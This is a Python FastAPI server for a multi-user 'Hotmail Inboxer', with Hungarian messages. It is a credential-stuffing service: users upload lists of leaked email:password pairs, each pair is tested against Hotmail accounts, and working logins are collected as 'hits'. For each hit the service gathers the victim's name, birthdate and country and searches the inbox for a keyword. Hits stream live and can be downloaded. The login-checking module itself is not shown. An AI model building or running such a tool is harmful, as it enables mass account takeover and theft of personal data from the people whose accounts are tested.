from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.requests import Request
from starlette.middleware.cors import CORSMiddleware
import asyncio
import threading
import os
import json
from datetime import datetime

from database import *
from auth import *
from checker import checker_worker_single

# ============================================================
# FASTAPI APP
# ============================================================
app = FastAPI(title="Hotmail Inboxer Multi-User")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

# WebSocket connections per user
user_connections = {}
ws_lock = threading.Lock()

# STOP FLAGS (user_id: asyncio.Event)
stop_flags = {}
stop_lock = threading.Lock()

# ============================================================
# WEBSOCKET BROADCAST
# ============================================================
def broadcast_to_user(user_id: str, message: str):
    with ws_lock:
        if user_id not in user_connections:
            return
        
        dead = []
        for ws_info in user_connections[user_id]:
            try:
                loop = ws_info["loop"]
                ws = ws_info["ws"]
                asyncio.run_coroutine_threadsafe(ws.send_text(message), loop)
            except Exception:
                dead.append(ws_info)
        
        for d in dead:
            user_connections[user_id].remove(d)
        
        if not user_connections[user_id]:
            del user_connections[user_id]

# ============================================================
# AUTH ROUTES
# ============================================================
@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request):
    return templates.TemplateResponse("register.html", {"request": request})

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

# ============================================================
# AUTH API
# ============================================================
@app.post("/api/register")
async def register(email: str = Form(...), password: str = Form(...)):
    if len(password) < 6:
        raise HTTPException(status_code=400, detail="A jelszónak legalább 6 karakter hosszúnak kell lennie")
    
    existing = await get_user_by_email(email)
    if existing:
        raise HTTPException(status_code=400, detail="Ez az email már regisztrálva van")
    
    hashed_pw = hash_password(password)
    user_id = await create_user(email, hashed_pw)
    token = create_access_token({"sub": email})
    
    return {"token": token, "email": email}

@app.post("/api/login")
async def login(email: str = Form(...), password: str = Form(...)):
    user = await get_user_by_email(email)
    
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(status_code=401, detail="Hibás email vagy jelszó")
    
    token = create_access_token({"sub": email})
    return {"token": token, "email": email}

@app.get("/api/me")
async def get_current_user_info(current_user = Depends(get_current_user)):
    return {
        "email": current_user["email"],
        "created_at": current_user["created_at"].isoformat()
    }

# ============================================================
# CHECKER ROUTES
# ============================================================
@app.post("/api/start")
async def start_checker(
    file: UploadFile,
    keyword: str = Form(...),
    speed: float = Form(0.3),
    current_user = Depends(get_current_user)
):
    """Checker indítása"""
    active = await get_active_run(str(current_user["_id"]))
    if active:
        raise HTTPException(status_code=400, detail="Már fut egy checker! Várd meg, amíg befejeződik.")
    
    if speed < 0.05:
        speed = 0.05
    elif speed > 5.0:
        speed = 5.0
    
    content = await file.read()
    combo_text = content.decode("utf-8", errors="ignore")
    
    lines = []
    for line in combo_text.splitlines():
        line = line.strip()
        if ':' in line and '@' in line:
            parts = line.split(':')
            if len(parts) == 2:
                lines.append(line)
    
    total = len(lines)
    
    if total == 0:
        raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor a fájlban")
    
    if total > 15000:
        raise HTTPException(status_code=400, detail="Maximum 15000 account engedélyezett egyszerre")
    
    run_id = await create_run(str(current_user["_id"]), keyword, total)
    
    # Stop flag létrehozása
    user_id = str(current_user["_id"])
    with stop_lock:
        stop_flags[user_id] = asyncio.Event()
    
    threading.Thread(
        target=run_checker_background,
        args=(run_id, user_id, lines, keyword, speed),
        daemon=True
    ).start()
    
    return {"run_id": run_id, "total": total, "speed": speed}

@app.post("/api/stop")
async def stop_checker(current_user = Depends(get_current_user)):
    """Checker leállítása (ÚJ!)"""
    user_id = str(current_user["_id"])
    
    with stop_lock:
        if user_id in stop_flags:
            stop_flags[user_id].set()  # Jelzés a szálnak
            return {"status": "stopping"}
    
    raise HTTPException(status_code=404, detail="Nincs futó checker")

def run_checker_background(run_id: str, user_id: str, lines: list, keyword: str, speed: float):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(execute_checker(run_id, user_id, lines, keyword, speed))
    loop.close()
    
    # Stop flag törlése
    with stop_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]

async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, speed: float = 0.3):
    """Checker futtatás (STOP SUPPORT + LIVE HITS KÜLDÉS)"""
    checked = hits = custom = bad = retries = 0
    total = len(lines)
    
    broadcast_to_user(user_id, json.dumps({
        "type": "log",
        "level": "info",
        "text": f"[START] {total} fiók betöltve | Keyword: {keyword} | Sebesség: {speed}s/account"
    }))
    
    for line in lines:
        # STOP ellenőrzés
        with stop_lock:
            if user_id in stop_flags and stop_flags[user_id].is_set():
                broadcast_to_user(user_id, json.dumps({
                    "type": "log",
                    "level": "info",
                    "text": f"[LEÁLLÍTVA] User által megállítva ({checked}/{total})"
                }))
                await finish_run(run_id)
                broadcast_to_user(user_id, json.dumps({"type": "stopped"}))
                return
        
        if ':' not in line or '@' not in line:
            continue
        
        try:
            email, password = line.split(':', 1)
        except:
            continue
        
        result = await asyncio.to_thread(checker_worker_single, email, password, keyword)
        
        checked += 1
        
        if result["status"] == "hit":
            hits += 1
            data = result["data"]
            line_text = (
                f"{data['email']}:{data['password']} | "
                f"Country={data['country']} | Name={data['name']} | "
                f"Birthdate={data['birthdate']} | Date={data['date']} | "
                f"Mails={data['mails']}"
            )
            await add_result_to_run(run_id, "hit", line_text)
            
            # LOG + LIVE HIT KÜLDÉS (külön üzenet típus!)
            broadcast_to_user(user_id, json.dumps({
                "type": "log",
                "level": "hit",
                "text": f"[HIT] {line_text}"
            }))
            broadcast_to_user(user_id, json.dumps({
                "type": "live_hit",  # ← ÚJ TÍPUS!
                "data": {
                    "email": data['email'],
                    "password": data['password'],
                    "country": data['country'],
                    "name": data['name'],
                    "birthdate": data['birthdate'],
                    "date": data['date'],
                    "mails": data['mails']
                }
            }))
            
        elif result["status"] == "custom":
            custom += 1
            data = result["data"]
            line_text = (
                f"{data['email']}:{data['password']} | "
                f"Country={data['country']} | Name={data['name']} | "
                f"Birthdate={data['birthdate']}"
            )
            await add_result_to_run(run_id, "custom", line_text)
            
            broadcast_to_user(user_id, json.dumps({
                "type": "log",
                "level": "custom",
                "text": f"[CUSTOM] {line_text}"
            }))
            broadcast_to_user(user_id, json.dumps({
                "type": "live_custom",  # ← ÚJ TÍPUS!
                "data": {
                    "email": data['email'],
                    "password": data['password'],
                    "country": data['country'],
                    "name": data['name'],
                    "birthdate": data['birthdate']
                }
            }))
            
        elif result["status"] == "bad":
            bad += 1
            broadcast_to_user(user_id, json.dumps({
                "type": "log",
                "level": "bad",
                "text": f"[BAD] {email}"
            }))
            
        else:
            retries += 1
        
        await update_run_stats(run_id, {
            "checked": checked,
            "hits": hits,
            "custom": custom,
            "bad": bad,
            "retries": retries
        })
        
        broadcast_to_user(user_id, json.dumps({
            "type": "stats",
            "run_id": run_id,
            "checked": checked,
            "hits": hits,
            "custom": custom,
            "bad": bad,
            "retries": retries,
            "total": total
        }))
        
        await asyncio.sleep(speed)
    
    await finish_run(run_id)
    
    broadcast_to_user(user_id, json.dumps({
        "type": "log",
        "level": "finish",
        "text": f"[KÉSZ] Hits: {hits} | Custom: {custom} | Bad: {bad}"
    }))
    
    broadcast_to_user(user_id, json.dumps({
        "type": "finished",
        "run_id": run_id
    }))

# ============================================================
# OTHER API
# ============================================================
@app.get("/api/runs")
async def get_user_runs_list(current_user = Depends(get_current_user)):
    runs = await get_user_runs(str(current_user["_id"]))
    
    for run in runs:
        run["_id"] = str(run["_id"])
        run["started_at"] = run["started_at"].isoformat()
        if run.get("finished_at"):
            run["finished_at"] = run["finished_at"].isoformat()
    
    return runs

@app.get("/api/run/{run_id}")
async def get_run_details(run_id: str, current_user = Depends(get_current_user)):
    run = await get_run(run_id)
    
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404, detail="Futtatás nem található")
    
    run["_id"] = str(run["_id"])
    run["started_at"] = run["started_at"].isoformat()
    if run.get("finished_at"):
        run["finished_at"] = run["finished_at"].isoformat()
    
    return run

@app.get("/api/download/{run_id}/{type}")
async def download_results(run_id: str, type: str, current_user = Depends(get_current_user)):
    run = await get_run(run_id)
    
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404, detail="Futtatás nem található")
    
    if type == "hits":
        lines = run.get("hit_lines", [])
        filename = f"Hotmail-Hits-{run_id}.txt"
    elif type == "custom":
        lines = run.get("custom_lines", [])
        filename = f"Hotmail-Custom-{run_id}.txt"
    else:
        raise HTTPException(status_code=400, detail="Érvénytelen típus")
    
    content = "\n".join(lines) if lines else "Nincs eredmény"
    
    return PlainTextResponse(
        content=content,
        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
    )

# ============================================================
# WEBSOCKET
# ============================================================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    await websocket.accept()
    
    email = decode_token(token)
    if not email:
        await websocket.close(code=1008, reason="Invalid token")
        return
    
    user = await get_user_by_email(email)
    if not user:
        await websocket.close(code=1008, reason="User not found")
        return
    
    user_id = str(user["_id"])
    
    loop = asyncio.get_event_loop()
    ws_info = {"ws": websocket, "loop": loop}
    
    with ws_lock:
        if user_id not in user_connections:
            user_connections[user_id] = []
        user_connections[user_id].append(ws_info)
    
    active_run = await get_active_run(user_id)
    if active_run:
        active_run["_id"] = str(active_run["_id"])
        active_run["started_at"] = active_run["started_at"].isoformat()
        await websocket.send_text(json.dumps({
            "type": "active_run",
            "run": active_run
        }))
    
    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except WebSocketDisconnect:
        with ws_lock:
            if user_id in user_connections and ws_info in user_connections[user_id]:
                user_connections[user_id].remove(ws_info)
                if not user_connections[user_id]:
                    del user_connections[user_id]

# ============================================================
# INDÍTÁS
# ============================================================
if __name__ == "__main__":
    import uvicorn
    
    port = int(os.getenv("PORT", 8000))
    
    print("\n" + "="*60)
    print("  🚀 Hotmail Inboxer - Multi-User Edition v3")
    print(f"  📡 http://0.0.0.0:{port}")
    print(f"  🔐 MongoDB: Configured")
    print(f"  ⚡ Features: Speed Control + STOP + Live Preview")
    print("="*60 + "\n")
    
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        reload=False,
        log_level="info"
    )
